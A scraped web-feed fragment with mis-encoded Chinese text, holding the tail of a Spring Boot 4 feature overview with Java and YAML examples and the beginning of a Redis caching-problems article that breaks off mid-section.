align="left">æ·±åº¦é›†æˆå¹¶ä¼˜åŒ–äº†å¯¹<strong>è™šæ‹Ÿçº¿ç¨‹ï¼ˆVirtual Threadsï¼‰</strong> çš„æ”¯æŒï¼Œç»“åˆå£°æ˜å¼HTTPå®¢æˆ·ç«¯ï¼Œç®€åŒ–é«˜å¹¶å‘åº”ç”¨çš„å¼€å‘ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>Consolidated Spring Securityæ”¯æŒ</strong></td><td align="left">æ•´åˆäº†Spring Securityçš„æ”¯æŒï¼Œå°†Kerberoså’Œç‹¬ç«‹çš„æˆæƒæœåŠ¡å™¨ç­‰ç‰¹æ€§çº³å…¥Spring Security 7ä¸»çº¿ã€‚</td></tr><tr><td align="left"/><td align="left"><strong>Spring Batchæ”¹è¿›</strong></td><td align="left">æä¾›äº†æ–°çš„æ— èµ„æºï¼ˆresourcelessï¼‰å’ŒåŸºäºMongoDBçš„ä»“åº“å®ç°ã€‚</td></tr></tbody></table>
<blockquote>
<p>æ³¨ï¼šå…³äº<strong>è™šæ‹Ÿçº¿ç¨‹</strong>ï¼Œéœ€ç‰¹åˆ«è¯´æ˜ï¼šè™½ç„¶è®¸å¤šå¼€å‘è€…ç¤¾åŒºæ–‡ç« å°†å…¶åˆ—ä¸ºSpring Boot 4çš„æ ¸å¿ƒç‰¹æ€§ï¼Œä½†æœ€æƒå¨çš„Springå®˜æ–¹æ€»ç»“ä¸­å¹¶æœªæ˜ç¡®å°†å…¶ä½œä¸ºSpring Boot 4çš„å†…ç½®é»˜è®¤ç‰¹æ€§é‡ç‚¹åˆ—å‡ºã€‚æ›´å‡†ç¡®çš„ç†è§£æ˜¯ï¼ŒSpring Boot 4è¿è¡Œåœ¨Java 21+ä¹‹ä¸Šï¼Œå¯ä»¥<strong>å®Œç¾æ”¯æŒå’Œåˆ©ç”¨è™šæ‹Ÿçº¿ç¨‹</strong>ï¼Œå¹¶å¯èƒ½æä¾›äº†ä¸€äº›é…ç½®ä¼˜åŒ–ï¼Œä½†å…¶æœ¬èº«å¹¶éä¸€ä¸ªå…¨æ–°çš„ã€Spring Boot 4ç‹¬å çš„å†…ç½®åŠŸèƒ½ã€‚</p>
</blockquote>
<h3 data-id="heading-9">2.1. æ ¸å¿ƒç‰¹æ€§è¯¦è§£ä¸ç¤ºä¾‹</h3>
<p>ä¸‹é¢ç”¨å…·ä½“ä»£ç å±•ç¤ºå‡ ä¸ªå…³é”®ç‰¹æ€§çš„ç”¨æ³•ã€‚</p>
<h4 data-id="heading-10">2.1.1. åŸç”ŸAPIç‰ˆæœ¬æ§åˆ¶</h4>
<p>ç°åœ¨å¯ä»¥åœ¨åŒä¸€ä¸ªURLä¸Šï¼Œé€šè¿‡æ³¨è§£ç›´æ¥å®šä¹‰å¤šä¸ªç‰ˆæœ¬çš„å¤„ç†æ–¹æ³•ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api/user")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserController</span> {
    <span class="hljs-meta">@GetMapping(version = "1")</span>
    <span class="hljs-keyword">public</span> UserV1 <span class="hljs-title function_">getUserV1</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è¿”å›æ—§ç‰ˆæ•°æ®æ¨¡å‹</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserV1</span>(<span class="hljs-string">"å¼ ä¸‰"</span>);
    }
    <span class="hljs-meta">@GetMapping(version = "2")</span>
    <span class="hljs-keyword">public</span> UserV2 <span class="hljs-title function_">getUserV2</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// è¿”å›æ–°ç‰ˆæ•°æ®æ¨¡å‹ï¼ŒåŒ…å«æ›´å¤šå­—æ®µ</span>
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserV2</span>(<span class="hljs-string">"å¼ ä¸‰"</span>, <span class="hljs-string">"zhangsan@example.com"</span>);
    }
}
</code></pre>
<p>è°ƒç”¨æ—¶ï¼Œå®¢æˆ·ç«¯é€šè¿‡åœ¨HTTPè¯·æ±‚å¤´ä¸­æŒ‡å®š<code>Version: 1</code>æˆ–<code>Version: 2</code>æ¥é€‰æ‹©ä¸åŒç‰ˆæœ¬çš„APIã€‚è¿™æå¤§åœ°ç®€åŒ–äº†APIæ¼”è¿›çš„ç»´æŠ¤å·¥ä½œã€‚</p>
<h4 data-id="heading-11">2.1.2. è™šæ‹Ÿçº¿ç¨‹æ”¯æŒ</h4>
<p>å¦‚æœåº”ç”¨è¿è¡Œåœ¨Java 21+ä¸Šï¼Œå¯ä»¥è½»æ¾å¯ç”¨è™šæ‹Ÿçº¿ç¨‹æ¥å¤„ç†é«˜å¹¶å‘ã€‚</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.yml</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">threads:</span>
    <span class="hljs-attr">virtual:</span>
      <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>  <span class="hljs-comment"># å…¨å±€å¯ç”¨è™šæ‹Ÿçº¿ç¨‹æ”¯æŒ</span>
</code></pre>
<p>å¯ç”¨åï¼Œ<code>@Async</code>å¼‚æ­¥ä»»åŠ¡ã€Web MVCè¯·æ±‚å¤„ç†ç­‰å°†ä¼šè‡ªåŠ¨ä½¿ç”¨è™šæ‹Ÿçº¿ç¨‹ï¼Œå¯ä»¥<strong>ç”¨æ›´å°‘çš„èµ„æºæ”¯æ’‘æ›´é«˜çš„å¹¶å‘</strong>ã€‚ä¸ä¼ ç»Ÿçº¿ç¨‹æ± ç›¸æ¯”ï¼Œä¸å†éœ€è¦ä¸ºçº¿ç¨‹æ•°é‡è°ƒä¼˜è€Œçƒ¦æ¼ã€‚</p>
<h4 data-id="heading-12">2.1.3. æ–°çš„BeanRegistraré…ç½®æ¨¡å‹</h4>
<p><code>BeanRegistrar</code>æä¾›äº†æ¯”ä¼ ç»Ÿ<code>@Bean</code>æ³¨è§£æ›´çµæ´»ã€æ›´å¼ºå¤§çš„Beanæ³¨å†Œæ–¹å¼ï¼Œç‰¹åˆ«é€‚åˆéœ€è¦æ ¹æ®å¤æ‚æ¡ä»¶æ‰¹é‡æ³¨å†ŒBeançš„åœºæ™¯ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.springframework.beans.factory.BeanRegistrar;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.BeanRegistry;
<span class="hljs-keyword">import</span> org.springframework.core.env.Environment;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyModuleRegistrar</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">BeanRegistrar</span> {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">register</span><span class="hljs-params">(BeanRegistry registry, Environment environment)</span> {
        <span class="hljs-comment">// æ‰¹é‡æ³¨å†Œä¸€æ‰¹ç›¸å…³çš„Bean</span>
        registry.registerBean(<span class="hljs-string">"serviceA"</span>, MyServiceA.class);
        registry.registerBean(<span class="hljs-string">"serviceB"</span>, MyServiceB.class);
        <span class="hljs-comment">// æ ¹æ®ç¯å¢ƒå±æ€§åŠ¨æ€æ³¨å†ŒBean</span>
        <span class="hljs-keyword">if</span> (environment.matchesProfiles(<span class="hljs-string">"cluster"</span>)) {
            registry.registerBean(<span class="hljs-string">"clusterService"</span>, ClusterService.class);
        }
    }
}
</code></pre>
<p>ç„¶ååœ¨é…ç½®ç±»ä¸­é€šè¿‡<code>@Import</code>å¯¼å…¥å³å¯ã€‚è¿™ä½¿å¾—å¤§å‹åº”ç”¨çš„æ¨¡å—åŒ–ç»„ç»‡æ›´åŠ æ¸…æ™°ã€‚</p>
<h4 data-id="heading-13">2.1.4. å£°æ˜å¼HTTPå®¢æˆ·ç«¯ (å·©å›ºå¢å¼º)</h4>
<p>åœ¨Spring Boot 3ä¸­å¼•å…¥çš„å£°æ˜å¼HTTPå®¢æˆ·ç«¯ï¼ˆ<code>@HttpExchange</code>ï¼‰å·²æˆä¸ºæœåŠ¡é—´è°ƒç”¨çš„é¦–é€‰æ–¹å¼ï¼Œåœ¨Spring Boot 4ä¸­æ›´ä¸ºæˆç†Ÿã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 1. å£°æ˜æ¥å£</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">UserServiceClient</span> {
    <span class="hljs-meta">@GetExchange("/users/{id}")</span>
    User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span>;
}
<span class="hljs-comment">// 2. åˆ›å»ºä»£ç†å¹¶æ³¨å…¥</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> UserServiceClient userServiceClient;
    <span class="hljs-keyword">public</span> <span class="hljs-title function_">OrderService</span><span class="hljs-params">(UserServiceClient userServiceClient)</span> {
        <span class="hljs-built_in">this</span>.userServiceClient = userServiceClient; <span class="hljs-comment">// åƒä½¿ç”¨æœ¬åœ°Beanä¸€æ ·è°ƒç”¨</span>
    }
}
</code></pre>
<h4 data-id="heading-14">2.1.5. å¢å¼ºçš„ç©ºå®‰å…¨(Null Safety)æ”¯æŒ</h4>
<p>Spring Boot 4è½¬å‘é‡‡ç”¨è¡Œä¸šæ ‡å‡†<strong>JSpecify</strong>æ³¨è§£ï¼Œæä¾›ç»Ÿä¸€çš„ç©ºå®‰å…¨çº¦æŸã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">import</span> org.jspecify.annotations.NonNull;
<span class="hljs-keyword">import</span> org.jspecify.annotations.Nullable;

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserService</span> {
    <span class="hljs-comment">// å‚æ•°nameæ˜ç¡®æ ‡è®°ä¸ºå¯ç©ºï¼Œè¿”å›å€¼æ˜ç¡®æ ‡è®°ä¸ºéç©º</span>
    <span class="hljs-keyword">public</span> <span class="hljs-meta">@NonNull</span> User <span class="hljs-title function_">createUser</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> String name)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(name != <span class="hljs-literal">null</span> ? name : <span class="hljs-string">"Guest"</span>);
    }
}
</code></pre>
<p>é…åˆIDEï¼ˆå¦‚IntelliJ IDEA 2024+ï¼‰ï¼Œè¿™äº›æ³¨è§£èƒ½åœ¨ç¼–è¯‘æœŸæä¾›è­¦å‘Šï¼Œæå¤§æå‡ä»£ç å¥å£®æ€§ã€‚</p>
<h3 data-id="heading-15">2.2. å‡çº§å»ºè®®ä¸æ€»ç»“</h3>
<p>Spring Boot 4æ˜¯ä¸€æ¬¡<strong>é¢å‘äº‘åŸç”Ÿå’Œä¸‹ä¸€ä»£Javaåº”ç”¨</strong>çš„åŸºçŸ³å‡çº§ã€‚å®ƒé€šè¿‡å¼ºåˆ¶æ‹¥æŠ± <strong>Java 17+</strong> å’Œ <strong>Jakarta EE 11</strong> å¥ å®šäº†ç°ä»£åŒ–åŸºç¡€ï¼Œå¹¶é€šè¿‡<strong>åŸç”Ÿé•œåƒ</strong>ã€<strong>è™šæ‹Ÿçº¿ç¨‹æ”¯æŒ</strong>å’Œ<strong>æ›´ä¼˜é›…çš„APIè®¾è®¡</strong>ï¼ˆå¦‚ç‰ˆæœ¬æ§åˆ¶ã€å£°æ˜å¼å®¢æˆ·ç«¯ï¼‰å¤§å¹…æå‡äº†å¼€å‘ä½“éªŒå’Œè¿è¡Œæ—¶æ•ˆèƒ½ã€‚</p>
<p><strong>å»ºè®®ï¼š</strong></p>
<ul>
<li><strong>æ–°é¡¹ç›®</strong>ï¼šå¦‚æœä»é›¶å¼€å§‹ï¼Œå¹¶ä¸”å›¢é˜ŸæŠ€æœ¯æ ˆå…è®¸ï¼ˆä½¿ç”¨Java 17+ï¼‰ï¼Œå¼ºçƒˆå»ºè®®ç›´æ¥åŸºäº <strong>Spring Boot 4</strong> åˆ›å»ºã€‚</li>
<li><strong>ç°æœ‰Spring Boot 3é¡¹ç›®</strong>ï¼šå¯ä»¥è¯„ä¼°å‡çº§æ”¶ç›Šï¼Œå¦‚å¯¹å¯åŠ¨é€Ÿåº¦ã€å†…å­˜å ç”¨æœ‰æè‡´è¦æ±‚ï¼ˆäº‘åŸç”Ÿï¼‰ï¼Œæˆ–éœ€ä½¿ç”¨åŸç”ŸAPIç‰ˆæœ¬æ§åˆ¶ç­‰æ–°ç‰¹æ€§ï¼Œåˆ™å¯è§„åˆ’å‡çº§ã€‚æ³¨æ„æå‰å¤„ç†<code>javax</code>åˆ°<code>jakarta</code>çš„åŒ…åå˜æ›´ã€‚</li>
<li><strong>ç°æœ‰Spring Boot 2.xæˆ–æ›´æ—©é¡¹ç›®</strong>ï¼šä¸å»ºè®®ç›´æ¥è·³å‡åˆ°4.0ã€‚åº”å…ˆæŒ‰ <strong>2.x -&gt; 3.x -&gt; 4.x</strong> çš„è·¯å¾„é€æ­¥å‡çº§ï¼Œæ¯æ¬¡å¤„ç†ä¸€ä¸ªä¸»è¦ç‰ˆæœ¬çš„ç ´åæ€§å˜æ›´ã€‚</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[rediså¸¸è§é—®é¢˜åˆ†æ]]></title>    <link>https://juejin.cn/post/7589940913767317539</link>    <guid>https://juejin.cn/post/7589940913767317539</guid>    <pubDate>2026-01-01T15:18:30.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589940913767317539" data-draft-id="7589920318133354496" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="rediså¸¸è§é—®é¢˜åˆ†æ"/> <meta itemprop="keywords" content="Redis"/> <meta itemprop="datePublished" content="2026-01-01T15:18:30.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“ˆé‡Œè°¢é¡¿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            rediså¸¸è§é—®é¢˜åˆ†æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“ˆé‡Œè°¢é¡¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-01T15:18:30.000Z" title="Thu Jan 01 2026 15:18:30 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-01
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨é«˜å¹¶å‘ç³»ç»Ÿä¸­ï¼Œ<strong>ç¼“å­˜ï¼ˆå¦‚ Redisï¼‰ä¸æ•°æ®åº“ï¼ˆå¦‚ MySQLï¼‰é…åˆä½¿ç”¨</strong>æ˜¯æå‡æ€§èƒ½çš„å…³é”®æ‰‹æ®µã€‚ä½†è‹¥è®¾è®¡ä¸å½“ï¼Œä¼šå¼•å‘å››ç±»ç»å…¸é—®é¢˜ï¼š<strong>åŒå†™ä¸ä¸€è‡´ã€ç¼“å­˜ç©¿é€ã€ç¼“å­˜é›ªå´©ã€ç¼“å­˜å‡»ç©¿</strong>ã€‚ä¸‹é¢é€ä¸€è¯¦è§£å…¶åŸç†ã€å±å®³åŠè§£å†³æ–¹æ¡ˆã€‚</p>
<hr/>
<h2 data-id="heading-0">ä¸€ã€ç¼“å­˜ä¸ DB åŒå†™ä¸ä¸€è‡´ï¼ˆCache-DB Inconsistencyï¼‰</h2>
<h3 data-id="heading-1">ğŸ” é—®é¢˜æè¿°</h3>
<p>å½“æ•°æ®æ›´æ–°æ—¶ï¼Œ<strong>å…ˆæ›´æ–°æ•°æ®åº“ï¼Œå†æ“ä½œç¼“å­˜</strong>ï¼ˆåˆ é™¤æˆ–æ›´æ–°ï¼‰ï¼Œä½†ç”±äºç½‘ç»œå»¶è¿Ÿã€ç¨‹åºå¼‚å¸¸æˆ–å¹¶å‘æ“ä½œï¼Œå¯¼è‡´ <strong>ç¼“å­˜ä¸æ•°æ®åº“ä¸­çš„æ•°æ®çŸ­æš‚æˆ–é•¿æœŸä¸ä¸€è‡´</strong>ã€‚</p>
<h3 data-id="heading-2">ğŸ§© å…¸å‹åœºæ™¯</h3>
<ol>
<li><strong>çº¿ç¨‹ A</strong> æ›´æ–° DB â†’ åˆ é™¤ç¼“å­˜</li>
<li><strong>çº¿ç¨‹ B</strong> åœ¨ A åˆ é™¤ç¼“å­˜åã€æ–°æ•°æ®å†™å…¥å‰ï¼ŒæŸ¥è¯¢ DBï¼ˆæ—§å€¼ï¼‰å¹¶å†™å…¥ç¼“å­˜</li>
<li>ç»“æœï¼š<strong>ç¼“å­˜ä¸­æ˜¯æ—§æ•°æ®ï¼ŒDB æ˜¯æ–°æ•°æ® â†’ ä¸ä¸€è‡´</strong></li>
</ol>
<pre><code class="hljs language-sql" lang="sql">sequenceDiagram
    participant A <span class="hljs-keyword">as</span> çº¿ç¨‹Aï¼ˆæ›´æ–°ï¼‰
    participant B <span class="hljs-keyword">as</span> çº¿ç¨‹Bï¼ˆè¯»å–ï¼‰
    participant DB
    participant Cache

    A<span class="hljs-operator">-</span><span class="hljs-operator">&gt;&gt;</span>DB: <span class="hljs-keyword">update</span> user.name <span class="hljs-operator">=</span> "Alice"
    A<span class="hljs-operator">-</span><span class="hljs-operator">&gt;&gt;</span>Cache: del <span class="hljs-keyword">user</span>:<span class="hljs-number">123</span>
    B<span class="hljs-operator">-</span><span class="hljs-operator">&gt;&gt;</span>Cache: <span class="hljs-keyword">get</span> <span class="hljs-keyword">user</span>:<span class="hljs-number">123</span> (miss)
    B<span class="hljs-operator">-</span><span class="hljs-operator">&gt;&gt;</span>DB: <span class="hljs-keyword">select</span> name â†’ "Bob" (æ—§å€¼ï¼)
    B<span class="hljs-operator">-</span><span class="hljs-operator">&gt;&gt;</span>Cache: <span class="hljs-keyword">set</span> <span class="hljs-keyword">user</span>:<span class="hljs-number">123</span> <span class="hljs-operator">=</span> "Bob"
    Note <span class="hljs-keyword">right</span> <span class="hljs-keyword">of</span> Cache: ç¼“å­˜è„æ•°æ®ï¼
</code></pre>
<h3 data-id="heading-3">âš ï¸ å±å®³</h3>
<ul>
<li>ç”¨æˆ·çœ‹åˆ°è¿‡æœŸæ•°æ®ï¼ˆå¦‚ä½™é¢ã€è®¢å•çŠ¶æ€é”™è¯¯ï¼‰</li>
<li>é‡‘èã€ç”µå•†ç­‰å¼ºä¸€è‡´æ€§åœºæ™¯ä¸å¯æ¥å—</li>
</ul>
<h3 data-id="heading-4">âœ… è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-5">æ–¹æ¡ˆ 1ï¼š<strong>Cache-Aside + å»¶è¿ŸåŒåˆ ï¼ˆæ¨èï¼‰</strong></h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">update_user</span>(<span class="hljs-params">user_id, new_name</span>):
    <span class="hljs-comment"># 1. åˆ é™¤ç¼“å­˜ï¼ˆç¬¬ä¸€æ¬¡ï¼‰</span>
    redis.delete(<span class="hljs-string">f"user:<span class="hljs-subst">{user_id}</span>"</span>)
    
    <span class="hljs-comment"># 2. æ›´æ–°æ•°æ®åº“</span>
    db.update(<span class="hljs-string">"UPDATE users SET name=%s WHERE id=%s"</span>, (new_name, user_id))
    
    <span class="hljs-comment"># 3. å»¶è¿Ÿä¸€æ®µæ—¶é—´åå†æ¬¡åˆ é™¤ç¼“å­˜ï¼ˆé˜²æ­¢æ­¥éª¤2æœŸé—´æœ‰æ—§æ•°æ®å†™å…¥ç¼“å­˜ï¼‰</span>
    time.sleep(<span class="hljs-number">0.5</span>)  <span class="hljs-comment"># æˆ–ç”¨æ¶ˆæ¯é˜Ÿåˆ—å¼‚æ­¥æ‰§è¡Œ</span>
    redis.delete(<span class="hljs-string">f"user:<span class="hljs-subst">{user_id}</span>"</span>)
</code></pre>
<blockquote>
<p>ğŸ’¡ <strong>åŸç†</strong>ï¼šç¬¬äºŒæ¬¡åˆ é™¤å¯æ¸…é™¤åœ¨ DB æ›´æ–°æœŸé—´è¢«å†™å…¥çš„æ—§ç¼“å­˜ã€‚</p>
</blockquote>
<h4 data-id="heading-6">æ–¹æ¡ˆ 2ï¼š<strong>å…ˆæ›´æ–°ç¼“å­˜ï¼Œå†æ›´æ–° DBï¼ˆä¸æ¨èï¼‰</strong></h4>
<ul>
<li>è‹¥ DB æ›´æ–°å¤±è´¥ï¼Œç¼“å­˜å·²å˜è„ï¼Œæ›´éš¾æ¢å¤</li>
</ul>
<h4 data-id="heading-7">æ–¹æ¡ˆ 3ï¼š<strong>ä½¿ç”¨ Binlog è®¢é˜…ï¼ˆæœ€ç»ˆä¸€è‡´æ€§ï¼‰</strong></h4>
<ul>
<li>é€šè¿‡ Canal / Debezium ç›‘å¬ MySQL Binlog</li>
<li>å¼‚æ­¥æ›´æ–°/åˆ é™¤ç¼“å­˜ï¼Œä¿è¯æœ€ç»ˆä¸€è‡´ï¼ˆé€‚åˆéå¼ºä¸€è‡´åœºæ™¯ï¼‰</li>
</ul>
<blockquote>
<p>ğŸ“Œ <strong>æœ€ä½³å®è·µ</strong>ï¼š</p>
<ul>
<li><strong>å¼ºä¸€è‡´åœºæ™¯</strong>ï¼šç›´æ¥è¯» DBï¼ˆç‰ºç‰²æ€§èƒ½ï¼‰</li>
<li><strong>æ™®é€šåœºæ™¯</strong>ï¼šé‡‡ç”¨â€œå…ˆåˆ ç¼“å­˜ â†’ æ›´æ–° DB â†’ å»¶è¿Ÿå†åˆ ç¼“å­˜â€</li>
</ul>
</blockquote>
<hr/>
<h2 data-id="heading-8">äºŒã€ç¼“å­˜ç©¿é€ï¼ˆCache Penetrationï¼‰</h2>
<h3 data-id="heading-9">ğŸ” é—®é¢˜æè¿°</h3>
<p>å¤§é‡è¯·æ±‚æŸ¥è¯¢ <strong>æ ¹æœ¬ä¸å­˜åœ¨çš„æ•°æ®</strong>ï¼ˆå¦‚ <code>user_id = -1</code>ï¼‰ï¼Œå¯¼è‡´ï¼š</p>
<ul>
<li>æ¯æ¬¡éƒ½ <strong>ç»•è¿‡ç¼“å­˜</strong>ï¼Œç›´å‡»æ•°æ®åº“</li>
<li>æ•°æ®åº“å‹åŠ›å‰§å¢ï¼Œç”šè‡³å®•æœº</li>
</ul>
<h3 data-id="heading-10">ğŸ§© å…¸å‹åœºæ™¯</h3>
<ul>
<li>æ¶æ„æ”»å‡»ï¼šéå†ä¸å­˜åœ¨çš„ ID</li>
<li>ä¸šåŠ¡é€»è¾‘ bugï¼šå‰ç«¯ä¼ å…¥éæ³•å‚æ•°</li>
</ul>
<h3 data-id="heading-11">âš ï¸ å±å®³</h3>
<ul>
<li>DB QPS æš´æ¶¨ï¼ŒCPU æ‰“æ»¡</li>
<li>æ­£å¸¸æœåŠ¡ä¸å¯ç”¨ï¼ˆé›ªå´©å‰å…†ï¼‰</li>
</ul>
<h3 data-id="heading-12">âœ… è§£å†³æ–¹æ¡ˆ</h3>
<h4 data-id="heading-13">æ–¹æ¡ˆ 1ï¼š<strong>ç¼“å­˜ç©ºå€¼ï¼ˆNull Cacheï¼‰</strong></h4>
